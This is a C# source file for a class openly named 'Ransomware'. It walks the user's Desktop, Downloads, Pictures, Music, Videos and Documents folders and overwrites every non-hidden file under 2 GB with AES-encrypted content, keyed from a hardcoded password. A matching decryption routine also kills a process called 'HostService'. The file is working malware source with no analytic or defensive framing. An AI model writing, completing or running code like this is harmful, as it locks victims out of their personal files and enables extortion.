using System;
using System.ComponentModel;
using System.IO;
using System.Windows;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using System.Diagnostics;

namespace TR
{
    class Ransomware
    {
        string password = "8410412190077";

        public void Encriptar()
        {
            string[] files1 = { "" };
            string[] files2 = { "" };
            string[] files3 = { "" };
            string[] files4 = { "" };
            string[] files5 = { "" };
            string[] files6 = { "" };
            try
            {
                files1 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*", SearchOption.AllDirectories);
                files2 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads") + @"\", "*", SearchOption.AllDirectories);
                files3 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Pictures") + @"\", "*", SearchOption.AllDirectories);
                files4 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Music") + @"\", "*", SearchOption.AllDirectories);
                files5 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Videos") + @"\", "*", SearchOption.AllDirectories);
                files6 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Documents") + @"\", "*", SearchOption.AllDirectories);
            }
            catch 
            {
            }

            List<string> list = new List<string>();
            list.AddRange(files1);
            list.AddRange(files2);
            list.AddRange(files3);
            list.AddRange(files4);
            list.AddRange(files5);
            list.AddRange(files6);
            string[] TOTAL = list.ToArray();
            foreach (string file in TOTAL)
            {
                FileInfo test = new FileInfo(file);
                if (!File.GetAttributes(file).HasFlag(FileAttributes.Hidden) && test.Length <= 2000000000)
                {
                    try
                    {
                        EncryptFile(file, password);
                    }
                    catch
                    {

                    }
                }
            }
        }
        public void Desencriptar(object sender, DoWorkEventArgs e)
        {
            string[] files1 = { "" };
            string[] files2 = { "" };
            string[] files3 = { "" };
            string[] files4 = { "" };
            string[] files5 = { "" };
            string[] files6 = { "" };
            try
            {
                files1 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*", SearchOption.AllDirectories);
                files2 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads") + @"\", "*", SearchOption.AllDirectories);
                files3 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Pictures") + @"\", "*", SearchOption.AllDirectories);
                files4 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Music") + @"\", "*", SearchOption.AllDirectories);
                files5 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Videos") + @"\", "*", SearchOption.AllDirectories);
                files6 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Documents") + @"\", "*", SearchOption.AllDirectories);
            }
            catch
            {
            }

            List<string> list = new List<string>();
            list.AddRange(files1);
            list.AddRange(files2);
            list.AddRange(files3);
            list.AddRange(files4);
            list.AddRange(files5);
            list.AddRange(files6);
            string[] TOTAL = list.ToArray();

            foreach (string file in TOTAL)
            {
                FileInfo test = new FileInfo(file);
                if (!File.GetAttributes(file).HasFlag(FileAttributes.Hidden) && test.Length <= 2000000000)
                {
                    try 
                    {
                        DecryptFile(file, password);
                    }
                    catch
                    {

                    }
                }
            }
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == "HostService")
                {
                    pr.Kill();
                }
            }


        }
        public void EncryptFile(string file, string password)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            string fileEncrypted = file;

            File.WriteAllBytes(fileEncrypted, bytesEncrypted);
        }
        public void DecryptFile(string fileEncrypted, string password)
        {
            byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            string file = fileEncrypted;
            File.WriteAllBytes(file, bytesDecrypted);
        }
    }
}
